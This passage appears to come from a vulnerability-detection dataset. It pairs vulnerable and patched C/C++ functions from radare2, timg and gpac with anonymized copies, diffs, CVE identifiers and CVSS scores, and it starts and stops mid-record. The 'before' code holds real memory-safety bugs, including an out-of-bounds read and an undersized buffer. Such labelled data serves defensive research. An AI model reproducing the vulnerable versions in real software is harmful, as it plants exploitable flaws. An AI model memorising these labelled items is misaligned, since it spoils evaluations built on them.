		r_strbuf_set (&op->esil, ""1,pc,-,brk,=[4],4,brk,+="");
#if 1
		if (len > 1) {
			const ut8 *p = buf + 1;
			int lev = 0, i = 1;
			len--;
			while (i < len && *p) {
				switch (*p) {
				case '[':
					lev++;
					break;
				case ']':
					lev--;
					if (lev < 1) {
						size_t delta = p - buf;
						dst = addr + (size_t)delta + 1;
						op->jump = dst;
						r_strbuf_set (&op->esil, ""1,pc,-,brk,=[4],4,brk,+=,"");
						goto beach;
					}
					break;
				case 0:
				case 0xff:
					op->type = R_ANAL_OP_TYPE_ILL;
					goto beach;
				}
				if (read_at && i == len - 1) {
#if 0
					// XXX unnecessary just break
					int new_buf_len = len + 1 + BUFSIZE_INC;
					ut8 *new_buf = calloc (new_buf_len, 1);
					if (new_buf) {
						free (buf);
						memcpy (new_buf, op->bytes, new_buf_len);
						buf = new_buf;
						read_at (bin->iob.io, op->addr + i, buf + i, 0xff);
						p = buf + i;
						len += BUFSIZE_INC;
					}
#else
					break;
#endif
				}
				p++;
				i++;
			}
		}
beach:
		free (buf);
#endif
		break;
	case ']':
		op->type = R_ANAL_OP_TYPE_UJMP;
		r_strbuf_set (&op->esil, ""4,brk,-=,ptr,[1],?{,brk,[4],pc,=,}"");
		break;
	case '>':
		op->type = R_ANAL_OP_TYPE_ADD;
		op->size = countChar (buf, len, '>');
		r_strbuf_setf (&op->esil, ""%d,ptr,+="", op->size);
		break;
	case '<':
		op->type = R_ANAL_OP_TYPE_SUB;
		op->size = countChar (buf, len, '<');
		r_strbuf_setf (&op->esil, ""%d,ptr,-="", op->size);
		break;
	case '+':
		op->size = countChar (buf, len, '+');
		op->type = R_ANAL_OP_TYPE_ADD;
		r_strbuf_setf (&op->esil, ""%d,ptr,+=[1]"", op->size);
		break;
	case '-':
		op->type = R_ANAL_OP_TYPE_SUB;
		op->size = countChar (buf, len, '-');
		r_strbuf_setf (&op->esil, ""%d,ptr,-=[1]"", op->size);
		break;
	case '.':
		// print element in stack to screen
		op->type = R_ANAL_OP_TYPE_STORE;
		r_strbuf_set (&op->esil, ""ptr,[1],scr,=[1],1,scr,+="");
		break;
	case ',':
		op->type = R_ANAL_OP_TYPE_LOAD;
		r_strbuf_set (&op->esil, ""kbd,[1],ptr,=[1],1,kbd,+="");
		break;
	case 0x00:
	case 0xff:
		op->type = R_ANAL_OP_TYPE_TRAP;
		break;
	default:
		op->type = R_ANAL_OP_TYPE_NOP;
		r_strbuf_set (&op->esil, "","");
		break;
	}
	return op->size;
}","static bool decode(RArchSession *VAR_0, RAnalOp *VAR_1, RArchDecodeMask VAR_2) {
	int VAR_3 = VAR_1->size;
	if (VAR_3 < 1) {
		return false;
	}
	ut8 *VAR_4 = VAR_1->bytes;
	const ut64 VAR_5 = VAR_1->addr;
	ut64 VAR_6 = 0LL;
	if (!VAR_1) {
		return 1;
	}
	if (VAR_2 & VAR_7) {
		(void) disassemble (VAR_1, VAR_4, VAR_3);
	}
	r_strbuf_init (&VAR_1->esil);
	VAR_1->size = 1;
	VAR_1->id = getid (VAR_4[0]);
	switch (VAR_4[0]) {
	case '[':
		VAR_1->type = VAR_8;
		/* COMMENT_0 */
		VAR_1->jump = VAR_6;
		VAR_1->fail = VAR_5 + 1;
		RArch *VAR_9 = VAR_0->arch;
		RIOReadAt VAR_10 = NULL;
		RBin *VAR_11 = R_UNWRAP2 (VAR_9, VAR_12.bin);
		if (VAR_11 && VAR_11->iob.read_at) {
			RIOReadAt VAR_10 = VAR_11->iob.read_at;
			VAR_4 = malloc (0xff);
			VAR_10 (VAR_11->iob.io, VAR_1->addr, VAR_4, 0xff);
		}
		r_strbuf_set (&VAR_1->esil, ""1,pc,-,brk,=[4],4,brk,+="");
#if 1
		if (VAR_3 > 1) {
			const ut8 *VAR_13 = VAR_4 + 1;
			int VAR_14 = 0, VAR_15 = 1;
			VAR_3--;
			while (VAR_15 < VAR_3 && *VAR_13) {
				switch (*VAR_13) {
				case '[':
					VAR_14++;
					break;
				case ']':
					VAR_14--;
					if (VAR_14 < 1) {
						size_t VAR_16 = VAR_13 - VAR_4;
						VAR_6 = VAR_5 + (size_t)VAR_16 + 1;
						VAR_1->jump = VAR_6;
						r_strbuf_set (&VAR_1->esil, ""1,pc,-,brk,=[4],4,brk,+=,"");
						goto beach;
					}
					break;
				case 0:
				case 0xff:
					VAR_1->type = VAR_17;
					goto beach;
				}
				if (VAR_10 && VAR_15 == VAR_3 - 1) {
#if 0
					/* COMMENT_1 */
					int VAR_18 = VAR_3 + 1 + VAR_19;
					ut8 *VAR_20 = calloc (VAR_18, 1);
					if (VAR_20) {
						free (VAR_4);
						memcpy (VAR_20, VAR_1->bytes, VAR_18);
						VAR_4 = VAR_20;
						VAR_10 (VAR_11->iob.io, VAR_1->addr + VAR_15, VAR_4 + VAR_15, 0xff);
						VAR_13 = VAR_4 + VAR_15;
						VAR_3 += VAR_19;
					}
#else
					break;
#endif
				}
				VAR_13++;
				VAR_15++;
			}
		}
beach:
		free (VAR_4);
#endif
		break;
	case ']':
		VAR_1->type = VAR_21;
		r_strbuf_set (&VAR_1->esil, ""4,brk,-=,ptr,[1],?{,brk,[4],pc,=,}"");
		break;
	case '>':
		VAR_1->type = VAR_22;
		VAR_1->size = countChar (VAR_4, VAR_3, '>');
		r_strbuf_setf (&VAR_1->esil, ""%d,ptr,+="", VAR_1->size);
		break;
	case '<':
		VAR_1->type = VAR_23;
		VAR_1->size = countChar (VAR_4, VAR_3, '<');
		r_strbuf_setf (&VAR_1->esil, ""%d,ptr,-="", VAR_1->size);
		break;
	case '+':
		VAR_1->size = countChar (VAR_4, VAR_3, '+');
		VAR_1->type = VAR_22;
		r_strbuf_setf (&VAR_1->esil, ""%d,ptr,+=[1]"", VAR_1->size);
		break;
	case '-':
		VAR_1->type = VAR_23;
		VAR_1->size = countChar (VAR_4, VAR_3, '-');
		r_strbuf_setf (&VAR_1->esil, ""%d,ptr,-=[1]"", VAR_1->size);
		break;
	case '.':
		/* COMMENT_2 */
		VAR_1->type = VAR_24;
		r_strbuf_set (&VAR_1->esil, ""ptr,[1],scr,=[1],1,scr,+="");
		break;
	case ',':
		VAR_1->type = VAR_25;
		r_strbuf_set (&VAR_1->esil, ""kbd,[1],ptr,=[1],1,kbd,+="");
		break;
	case 0x00:
	case 0xff:
		VAR_1->type = VAR_26;
		break;
	default:
		VAR_1->type = VAR_27;
		r_strbuf_set (&VAR_1->esil, "","");
		break;
	}
	return VAR_1->size;
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/plugin.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -1,12 +1,10 @@
 static bool decode(RArchSession *as, RAnalOp *op, RArchDecodeMask mask) {
 	int len = op->size;
-	const ut8 *_buf = op->bytes;
-	const ut64 addr = op->addr;
 	if (len < 1) {
 		return false;
 	}
-
-	ut8 *buf = (ut8*)_buf; // XXX
+	ut8 *buf = op->bytes;
+	const ut64 addr = op->addr;
 	ut64 dst = 0LL;
 	if (!op) {
 		return 1;
@@ -33,29 +31,32 @@
 		}
 		r_strbuf_set (&op->esil, ""1,pc,-,brk,=[4],4,brk,+="");
 #if 1
-		{
+		if (len > 1) {
 			const ut8 *p = buf + 1;
 			int lev = 0, i = 1;
 			len--;
 			while (i < len && *p) {
-				if (*p == '[') {
+				switch (*p) {
+				case '[':
 					lev++;
-				}
-				if (*p == ']') {
+					break;
+				case ']':
 					lev--;
-					if (lev == -1) {
-						dst = addr + (size_t)(p - buf) + 1;
+					if (lev < 1) {
+						size_t delta = p - buf;
+						dst = addr + (size_t)delta + 1;
 						op->jump = dst;
 						r_strbuf_set (&op->esil, ""1,pc,-,brk,=[4],4,brk,+=,"");
 						goto beach;
 					}
-				}
-				if (*p == 0x00 || *p == 0xff) {
+					break;
+				case 0:
+				case 0xff:
 					op->type = R_ANAL_OP_TYPE_ILL;
 					goto beach;
 				}
 				if (read_at && i == len - 1) {
-					break;
+#if 0
 					// XXX unnecessary just break
 					int new_buf_len = len + 1 + BUFSIZE_INC;
 					ut8 *new_buf = calloc (new_buf_len, 1);
@@ -67,6 +68,9 @@
 						p = buf + i;
 						len += BUFSIZE_INC;
 					}
+#else
+					break;
+#endif
 				}
 				p++;
 				i++;","{'deleted_lines': ['\tconst ut8 *_buf = op->bytes;', '\tconst ut64 addr = op->addr;', '', '\tut8 *buf = (ut8*)_buf; // XXX', '\t\t{', ""\t\t\t\tif (*p == '[') {"", '\t\t\t\t}', ""\t\t\t\tif (*p == ']') {"", '\t\t\t\t\tif (lev == -1) {', '\t\t\t\t\t\tdst = addr + (size_t)(p - buf) + 1;', '\t\t\t\t}', '\t\t\t\tif (*p == 0x00 || *p == 0xff) {', '\t\t\t\t\tbreak;'], 'added_lines': ['\tut8 *buf = op->bytes;', '\tconst ut64 addr = op->addr;', '\t\tif (len > 1) {', '\t\t\t\tswitch (*p) {', ""\t\t\t\tcase '[':"", '\t\t\t\t\tbreak;', ""\t\t\t\tcase ']':"", '\t\t\t\t\tif (lev < 1) {', '\t\t\t\t\t\tsize_t delta = p - buf;', '\t\t\t\t\t\tdst = addr + (size_t)delta + 1;', '\t\t\t\t\tbreak;', '\t\t\t\tcase 0:', '\t\t\t\tcase 0xff:', '#if 0', '#else', '\t\t\t\t\tbreak;', '#endif']}",True,Heap-based Buffer Overflow in GitHub repository radareorg/radare2 prior to 5.9.0.,9.8,CRITICAL,3,valid,2023-08-14T13:56:13Z,4
CVE-2023-4322,['CWE-787'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,radareorg/radare2,"Fix 1byte heap oobread in the brainfuck disassembler

* https://huntr.dev/bounties/06e2484c-d6f1-4497-af67-26549be9fffd/
* Kudos to @7resp4ss for reporting",ba919adb74ac368bf76b150a00347ded78b572dd,https://github.com/radareorg/radare2/commit/ba919adb74ac368bf76b150a00347ded78b572dd,libr/arch/p/bf/plugin.c,getid,"static int getid(char ch) {
const char *keys = ""[]<>+-,."";
const char *cidx = strchr (keys, ch);
return cidx? cidx - keys + 1: 0;
}","static int getid(char VAR_0) {
const char *VAR_1 = ""[]<>+-,."";
const char *VAR_2 = strchr (VAR_1, VAR_0);
return VAR_2? VAR_2 - VAR_1 + 1: 0;
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/plugin.c/vul/before/0.json,"static int getid(char ch) {
	const char *const keys = ""[]<>+-,."";
	const char *const cidx = strchr (keys, ch);
	return cidx? cidx - keys + 1: 0;
}","static int getid(char VAR_0) {
	const char *const VAR_1 = ""[]<>+-,."";
	const char *const VAR_2 = strchr (VAR_1, VAR_0);
	return VAR_2? VAR_2 - VAR_1 + 1: 0;
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/plugin.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,5 +1,5 @@
 static int getid(char ch) {
-	const char *keys = ""[]<>+-,."";
-	const char *cidx = strchr (keys, ch);
+	const char *const keys = ""[]<>+-,."";
+	const char *const cidx = strchr (keys, ch);
 	return cidx? cidx - keys + 1: 0;
 }","{'deleted_lines': ['\tconst char *keys = ""[]<>+-,."";', '\tconst char *cidx = strchr (keys, ch);'], 'added_lines': ['\tconst char *const keys = ""[]<>+-,."";', '\tconst char *const cidx = strchr (keys, ch);']}",True,Heap-based Buffer Overflow in GitHub repository radareorg/radare2 prior to 5.9.0.,9.8,CRITICAL,3,valid,2023-08-14T13:56:13Z,4
CVE-2023-4322,['CWE-787'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,radareorg/radare2,"Fix 1byte heap oobread in the brainfuck disassembler

* https://huntr.dev/bounties/06e2484c-d6f1-4497-af67-26549be9fffd/
* Kudos to @7resp4ss for reporting",ba919adb74ac368bf76b150a00347ded78b572dd,https://github.com/radareorg/radare2/commit/ba919adb74ac368bf76b150a00347ded78b572dd,libr/core/cmd_anal.c,axfm,"static void axfm(RCore *core) {
RVecAnalRef *refs = r_anal_xrefs_get_from (core->anal, UT64_MAX);
if (refs && !RVecAnalRef_empty (refs)) {
RVecAnalRef_sort (refs, compare_ref);
ut64 last_addr = UT64_MAX;
RAnalRef *ref;
R_VEC_FOREACH (refs, ref) {
const bool is_first = ref->addr != last_addr;
const char *name;
if (is_first) {
name = axtm_name (core, ref->addr);
r_cons_printf (""0x%""PFMT64x"": %s\n"", ref->addr, name? name: ""?"");
}
name = axtm_name (core, ref->at);
r_cons_printf (""  0x%""PFMT64x"": %s\n"", ref->at, name? name: ""?"");
last_addr = ref->addr;
}
}
RVecAnalRef_free (refs);
}","static void axfm(RCore *VAR_0) {
RVecAnalRef *VAR_1 = r_anal_xrefs_get_from (VAR_0->anal, VAR_2);
if (VAR_1 && !RVecAnalRef_empty (VAR_1)) {
RVecAnalRef_sort (VAR_1, VAR_3);
ut64 VAR_4 = VAR_2;
RAnalRef *VAR_5;
R_VEC_FOREACH (VAR_1, VAR_5) {
const bool VAR_6 = VAR_5->addr != VAR_4;
const char *VAR_7;
if (VAR_6) {
VAR_7 = axtm_name (VAR_0, VAR_5->addr);
r_cons_printf (""0x%""VAR_8"": %s\n"", VAR_5->addr, VAR_7? VAR_7: ""?"");
}
VAR_7 = axtm_name (VAR_0, VAR_5->at);
r_cons_printf (""  0x%""VAR_8"": %s\n"", VAR_5->at, VAR_7? VAR_7: ""?"");
VAR_4 = VAR_5->addr;
}
}
RVecAnalRef_free (VAR_1);
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/cmd_anal.c/vul/before/2.json,"static void axfm(RCore *core) {
	RVecAnalRef *refs = r_anal_xrefs_get_from (core->anal, UT64_MAX);
	if (refs && !RVecAnalRef_empty (refs)) {
		RVecAnalRef_sort (refs, compare_ref);

		ut64 last_addr = UT64_MAX;
		RAnalRef *ref;
		R_VEC_FOREACH (refs, ref) {
			const bool is_first = ref->addr != last_addr;
			const char *name;
			if (is_first) {
				name = axtm_name (core, ref->addr);
				r_cons_printf (""0x%""PFMT64x"": %s\n"", ref->addr, name? name: ""?"");
			}

			name = axtm_name (core, ref->at);
			r_cons_printf (""  0x%""PFMT64x"": %s\n"", ref->at, name? name: ""?"");

			last_addr = ref->addr;
		}
	}
	RVecAnalRef_free (refs);
}","static void axfm(RCore *VAR_0) {
	RVecAnalRef *VAR_1 = r_anal_xrefs_get_from (VAR_0->anal, VAR_2);
	if (VAR_1 && !RVecAnalRef_empty (VAR_1)) {
		RVecAnalRef_sort (VAR_1, VAR_3);

		ut64 VAR_4 = VAR_2;
		RAnalRef *VAR_5;
		R_VEC_FOREACH (VAR_1, VAR_5) {
			const bool VAR_6 = VAR_5->addr != VAR_4;
			const char *VAR_7;
			if (VAR_6) {
				VAR_7 = axtm_name (VAR_0, VAR_5->addr);
				r_cons_printf (""0x%""VAR_8"": %s\n"", VAR_5->addr, VAR_7? VAR_7: ""?"");
			}

			VAR_7 = axtm_name (VAR_0, VAR_5->at);
			r_cons_printf (""  0x%""VAR_8"": %s\n"", VAR_5->at, VAR_7? VAR_7: ""?"");

			VAR_4 = VAR_5->addr;
		}
	}
	RVecAnalRef_free (VAR_1);
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/cmd_anal.c/vul/after/2.json,"--- func_before
+++ func_after
@@ -19,6 +19,5 @@
 			last_addr = ref->addr;
 		}
 	}
-
 	RVecAnalRef_free (refs);
 }","{'deleted_lines': [''], 'added_lines': []}",True,Heap-based Buffer Overflow in GitHub repository radareorg/radare2 prior to 5.9.0.,9.8,CRITICAL,3,valid,2023-08-14T13:56:13Z,4
CVE-2023-4322,['CWE-787'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,radareorg/radare2,"Fix 1byte heap oobread in the brainfuck disassembler

* https://huntr.dev/bounties/06e2484c-d6f1-4497-af67-26549be9fffd/
* Kudos to @7resp4ss for reporting",ba919adb74ac368bf76b150a00347ded78b572dd,https://github.com/radareorg/radare2/commit/ba919adb74ac368bf76b150a00347ded78b572dd,libr/core/cmd_anal.c,cmd_anal_ucall_ref,"static void cmd_anal_ucall_ref(RCore *core, ut64 addr) {
RAnalFunction * fcn = r_anal_get_function_at (core->anal, addr);
if (fcn) {
r_cons_printf ("" ; %s"", fcn->name);
} else {
r_cons_printf ("" ; 0x%"" PFMT64x, addr);
}
}","static void cmd_anal_ucall_ref(RCore *VAR_0, ut64 VAR_1) {
RAnalFunction * VAR_2 = r_anal_get_function_at (VAR_0->anal, VAR_1);
if (VAR_2) {
r_cons_printf ("" ; %s"", VAR_2->name);
} else {
r_cons_printf ("" ; 0x%"" VAR_3, VAR_1);
}
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/cmd_anal.c/vul/before/0.json,"static void cmd_anal_ucall_ref(RCore *core, ut64 addr) {
	RAnalFunction *fcn = r_anal_get_function_at (core->anal, addr);
	if (fcn) {
		r_cons_printf ("" ; %s"", fcn->name);
	} else {
		r_cons_printf ("" ; 0x%"" PFMT64x, addr);
	}
}","static void cmd_anal_ucall_ref(RCore *VAR_0, ut64 VAR_1) {
	RAnalFunction *VAR_2 = r_anal_get_function_at (VAR_0->anal, VAR_1);
	if (VAR_2) {
		r_cons_printf ("" ; %s"", VAR_2->name);
	} else {
		r_cons_printf ("" ; 0x%"" VAR_3, VAR_1);
	}
}",radareorg/radare2/ba919adb74ac368bf76b150a00347ded78b572dd/cmd_anal.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,5 +1,5 @@
 static void cmd_anal_ucall_ref(RCore *core, ut64 addr) {
-	RAnalFunction * fcn = r_anal_get_function_at (core->anal, addr);
+	RAnalFunction *fcn = r_anal_get_function_at (core->anal, addr);
 	if (fcn) {
 		r_cons_printf ("" ; %s"", fcn->name);
 	} else {","{'deleted_lines': ['\tRAnalFunction * fcn = r_anal_get_function_at (core->anal, addr);'], 'added_lines': ['\tRAnalFunction *fcn = r_anal_get_function_at (core->anal, addr);']}",True,Heap-based Buffer Overflow in GitHub repository radareorg/radare2 prior to 5.9.0.,9.8,CRITICAL,3,valid,2023-08-14T13:56:13Z,4
CVE-2023-40968,['CWE-120'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,hzeller/timg,"Allocate enough memory for overhang pixels in quarter-rendering of uneven columns.

Columns with an uneven width in quarter rendering need a backing buffer for
the overhang pixel for quarter rendering (which is rounded to next even
pixel).

Issues #115",2e9414e668144bbe0afc074dac17b74ef4acfdcf,https://github.com/hzeller/timg/commit/2e9414e668144bbe0afc074dac17b74ef4acfdcf,src/unicode-block-canvas.cc,UnicodeBlockCanvas::RequestBuffers,"char *UnicodeBlockCanvas::RequestBuffers(int width, int height) {
static const int max_pixel_size =
strlen(""\033["")                                       + PIXEL_SET_COLOR_LEN + ESCAPE_COLOR_MAX_LEN          + 1                                           
+ PIXEL_SET_COLOR_LEN + ESCAPE_COLOR_MAX_LEN          + 1                                           
+ PIXEL_BLOCK_CHARACTER_LEN;
static const int opt_cursor_up    = strlen(SCREEN_CURSOR_UP_FORMAT) + 3;
static const int opt_cursor_right = strlen(SCREEN_CURSOR_RIGHT_FORMAT) + 3;
const int vertical_characters = (height + 1) / 2;      const size_t content_size =
opt_cursor_up          +
vertical_characters * (opt_cursor_right                                           + width * max_pixel_size                                   + SCREEN_END_OF_LINE_LEN);  
const size_t new_backing = width * (height + 1) * sizeof(rgba_t);
if (new_backing > backing_buffer_size_) {
backing_buffer_      = (rgba_t *)realloc(backing_buffer_, new_backing);
backing_buffer_size_ = new_backing;
}
const size_t new_empty = width * sizeof(rgba_t);
if (new_empty > empty_line_size_) {
empty_line_      = (rgba_t *)realloc(empty_line_, new_empty);
empty_line_size_ = new_empty;
memset(empty_line_, 0x00, empty_line_size_);
}
return new char[content_size];
}","char *UnicodeBlockCanvas::RequestBuffers(int VAR_0, int VAR_1) {
static const int VAR_2 =
strlen(""\033["")                               
+ VAR_3 + VAR_4  
+ 1                                           
+ VAR_3 + VAR_4  
+ 1                                           
+ VAR_5;
static const int VAR_6    = strlen(VAR_7) + 3;
static const int VAR_8 = strlen(VAR_9) + 3;
const int VAR_10 = (VAR_1 + 1) / 2;  
const size_t VAR_11 =
VAR_6  
+
VAR_10 * (VAR_8            
+ VAR_0 * VAR_2    
+ VAR_12);  
const size_t VAR_13 = VAR_0 * (VAR_1 + 1) * sizeof(VAR_14);
if (VAR_13 > VAR_15) {
VAR_16      = (rgba_t *)realloc(VAR_16, VAR_13);
VAR_15 = VAR_13;
}
const size_t VAR_17 = VAR_0 * sizeof(rgba_t);
if (VAR_17 > VAR_18) {
VAR_19      = (rgba_t *)realloc(VAR_19, VAR_17);
VAR_18 = VAR_17;
memset(VAR_19, 0x00, VAR_18);
}
return new char[VAR_11];
}",hzeller/timg/2e9414e668144bbe0afc074dac17b74ef4acfdcf/unicode-block-canvas.cc/vul/before/0.json,"char *UnicodeBlockCanvas::RequestBuffers(int width, int height) {
    // Pixels will be variable size depending on if we need to change colors
    // between two adjacent pixels. This is the maximum size they can be.
    static const int max_pixel_size =
        strlen(""\033["")                               //
        + PIXEL_SET_COLOR_LEN + ESCAPE_COLOR_MAX_LEN  //
        + 1                                           /* ; */
        + PIXEL_SET_COLOR_LEN + ESCAPE_COLOR_MAX_LEN  //
        + 1                                           /* m */
        + PIXEL_BLOCK_CHARACTER_LEN;
    // Few extra space for number printed in the format.
    static const int opt_cursor_up    = strlen(SCREEN_CURSOR_UP_FORMAT) + 3;
    static const int opt_cursor_right = strlen(SCREEN_CURSOR_RIGHT_FORMAT) + 3;
    const int vertical_characters = (height + 1) / 2;  // two pixels, one glyph
    const size_t content_size =
        opt_cursor_up  // Jump up
        +
        vertical_characters * (opt_cursor_right            // Horizontal jump
                               + width * max_pixel_size    // pixels in one row
                               + SCREEN_END_OF_LINE_LEN);  // Finishing a line.

    // Depending on even/odd situation, we might need one extra row.
    // For quarter, we have one extra possible pixel wider.
    const size_t new_backing = (width + 1) * (height + 1) * sizeof(rgba_t);
    if (new_backing > backing_buffer_size_) {
        backing_buffer_      = (rgba_t *)realloc(backing_buffer_, new_backing);
        backing_buffer_size_ = new_backing;
    }

    const size_t new_empty = (width + 1) * sizeof(rgba_t);
    if (new_empty > empty_line_size_) {
        empty_line_      = (rgba_t *)realloc(empty_line_, new_empty);
        empty_line_size_ = new_empty;
        memset(empty_line_, 0x00, empty_line_size_);
    }
    return new char[content_size];
}","char *UnicodeBlockCanvas::RequestBuffers(int VAR_0, int VAR_1) {
    /* COMMENT_0 */
    /* COMMENT_1 */
    static const int VAR_2 =
        strlen(""\033["")                               /* COMMENT_2 */
        + VAR_3 + VAR_4  /* COMMENT_2 */
        + 1                                           /* COMMENT_3 */
        + VAR_3 + VAR_4  /* COMMENT_2 */
        + 1                                           /* COMMENT_4 */
        + VAR_5;
    /* COMMENT_5 */
    static const int VAR_6    = strlen(VAR_7) + 3;
    static const int VAR_8 = strlen(VAR_9) + 3;
    const int VAR_10 = (VAR_1 + 1) / 2;  /* COMMENT_6 */
    const size_t VAR_11 =
        VAR_6  /* COMMENT_7 */
        +
        VAR_10 * (VAR_8            /* COMMENT_8 */
                               + VAR_0 * VAR_2    /* COMMENT_9 */
                               + VAR_12);  /* COMMENT_10 */

    /* COMMENT_11 */
    /* COMMENT_12 */
    const size_t VAR_13 = (VAR_0 + 1) * (VAR_1 + 1) * sizeof(VAR_14);
    if (VAR_13 > VAR_15) {
        VAR_16      = (rgba_t *)realloc(VAR_16, VAR_13);
        VAR_15 = VAR_13;
    }

    const size_t VAR_17 = (VAR_0 + 1) * sizeof(rgba_t);
    if (VAR_17 > VAR_18) {
        VAR_19      = (rgba_t *)realloc(VAR_19, VAR_17);
        VAR_18 = VAR_17;
        memset(VAR_19, 0x00, VAR_18);
    }
    return new char[VAR_11];
}",hzeller/timg/2e9414e668144bbe0afc074dac17b74ef4acfdcf/unicode-block-canvas.cc/vul/after/0.json,"--- func_before
+++ func_after
@@ -20,13 +20,14 @@
                                + SCREEN_END_OF_LINE_LEN);  // Finishing a line.
 
     // Depending on even/odd situation, we might need one extra row.
-    const size_t new_backing = width * (height + 1) * sizeof(rgba_t);
+    // For quarter, we have one extra possible pixel wider.
+    const size_t new_backing = (width + 1) * (height + 1) * sizeof(rgba_t);
     if (new_backing > backing_buffer_size_) {
         backing_buffer_      = (rgba_t *)realloc(backing_buffer_, new_backing);
         backing_buffer_size_ = new_backing;
     }
 
-    const size_t new_empty = width * sizeof(rgba_t);
+    const size_t new_empty = (width + 1) * sizeof(rgba_t);
     if (new_empty > empty_line_size_) {
         empty_line_      = (rgba_t *)realloc(empty_line_, new_empty);
         empty_line_size_ = new_empty;","{'deleted_lines': ['    const size_t new_backing = width * (height + 1) * sizeof(rgba_t);', '    const size_t new_empty = width * sizeof(rgba_t);'], 'added_lines': ['    // For quarter, we have one extra possible pixel wider.', '    const size_t new_backing = (width + 1) * (height + 1) * sizeof(rgba_t);', '    const size_t new_empty = (width + 1) * sizeof(rgba_t);']}",True,Buffer Overflow vulnerability in hzeller timg v.1.5.1 and before allows a remote attacker to cause a denial of service via the 0x61200000045c address.,7.5,HIGH,2,valid,2023-08-16T23:23:24Z,4
CVE-2023-41000,['CWE-416'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,fix #2550: delete previously added command_buffers in case of error,0018b5e4e07a1465287e7dff69b387929f5a75fa,https://github.com/gpac/gpac/commit/0018b5e4e07a1465287e7dff69b387929f5a75fa,src/bifs/memory_decoder.c,BM_ParseCommand,"GF_Err BM_ParseCommand(GF_BifsDecoder *codec, GF_BitStream *bs, GF_List *com_list)
{
u8 go, type;
GF_Err e;
go = 1;
e = GF_OK;
GF_SceneGraph *cur_graph = codec->current_graph;
GF_Proto *cur_proto = codec->pCurrentProto;
codec->LastError = GF_OK;
while (go) {
type = gf_bs_read_int(bs, 2);
switch (type) {
case 0:
e = BM_ParseInsert(codec, bs, com_list);
break;
case 1:
e = BM_ParseDelete(codec, bs, com_list);
break;
case 2:
e = BM_ParseReplace(codec, bs, com_list);
break;
case 3:
e = BM_SceneReplace(codec, bs, com_list);
break;
}
if (e) break;
go = gf_bs_read_int(bs, 1);
}
while (gf_list_count(codec->QPs)) {
gf_bifs_dec_qp_remove(codec, GF_TRUE);
}
codec->current_graph = cur_graph;
codec->pCurrentProto = cur_proto;
return e;
}","GF_Err BM_ParseCommand(GF_BifsDecoder *VAR_0, GF_BitStream *VAR_1, GF_List *VAR_2)
{
u8 VAR_3, VAR_4;
GF_Err VAR_5;
VAR_3 = 1;
VAR_5 = VAR_6;
GF_SceneGraph *VAR_7 = VAR_0->current_graph;
GF_Proto *VAR_8 = VAR_0->pCurrentProto;
VAR_0->LastError = VAR_6;
while (VAR_3) {
VAR_4 = gf_bs_read_int(VAR_1, 2);
switch (VAR_4) {
case 0:
VAR_5 = BM_ParseInsert(VAR_0, VAR_1, VAR_2);
break;
case 1:
VAR_5 = BM_ParseDelete(VAR_0, VAR_1, VAR_2);
break;
case 2:
VAR_5 = BM_ParseReplace(VAR_0, VAR_1, VAR_2);
break;
case 3:
VAR_5 = BM_SceneReplace(VAR_0, VAR_1, VAR_2);
break;
}
if (VAR_5) break;
VAR_3 = gf_bs_read_int(VAR_1, 1);
}
while (gf_list_count(VAR_0->QPs)) {
gf_bifs_dec_qp_remove(VAR_0, VAR_9);
}
VAR_0->current_graph = VAR_7;
VAR_0->pCurrentProto = VAR_8;
return VAR_5;
}",gpac/0018b5e4e07a1465287e7dff69b387929f5a75fa/memory_decoder.c/vul/before/0.json,"GF_Err BM_ParseCommand(GF_BifsDecoder *codec, GF_BitStream *bs, GF_List *com_list)
{
	u8 go, type;
	GF_Err e;
	go = 1;
	e = GF_OK;
	GF_SceneGraph *cur_graph = codec->current_graph;
	GF_Proto *cur_proto = codec->pCurrentProto;

	u32 nbBufs = gf_list_count(codec->command_buffers);

	codec->LastError = GF_OK;
	while (go) {
		type = gf_bs_read_int(bs, 2);
		switch (type) {
		case 0:
			e = BM_ParseInsert(codec, bs, com_list);
			break;
		case 1:
			e = BM_ParseDelete(codec, bs, com_list);
			break;
		case 2:
			e = BM_ParseReplace(codec, bs, com_list);
			break;
		case 3:
			e = BM_SceneReplace(codec, bs, com_list);
			break;
		}
		if (e) break;
		go = gf_bs_read_int(bs, 1);
	}
	while (gf_list_count(codec->QPs)) {
		gf_bifs_dec_qp_remove(codec, GF_TRUE);
	}

	if (e) {
		while (gf_list_count(codec->command_buffers) > nbBufs) {
			CommandBufferItem *cbi;
			cbi = (CommandBufferItem *)gf_list_pop_back(codec->command_buffers);
			if (cbi->node) gf_node_unregister(cbi->node, NULL);
			gf_free(cbi);
		}
	}

	codec->current_graph = cur_graph;
	codec->pCurrentProto = cur_proto;
	return e;
}","GF_Err BM_ParseCommand(GF_BifsDecoder *VAR_0, GF_BitStream *VAR_1, GF_List *VAR_2)
{
	u8 VAR_3, VAR_4;
	GF_Err VAR_5;
	VAR_3 = 1;
	VAR_5 = VAR_6;
	GF_SceneGraph *VAR_7 = VAR_0->current_graph;
	GF_Proto *VAR_8 = VAR_0->pCurrentProto;

	u32 VAR_9 = gf_list_count(VAR_0->command_buffers);

	VAR_0->LastError = VAR_6;
	while (VAR_3) {
		VAR_4 = gf_bs_read_int(VAR_1, 2);
		switch (VAR_4) {
		case 0:
			VAR_5 = BM_ParseInsert(VAR_0, VAR_1, VAR_2);
			break;
		case 1:
			VAR_5 = BM_ParseDelete(VAR_0, VAR_1, VAR_2);
			break;
		case 2:
			VAR_5 = BM_ParseReplace(VAR_0, VAR_1, VAR_2);
			break;
		case 3:
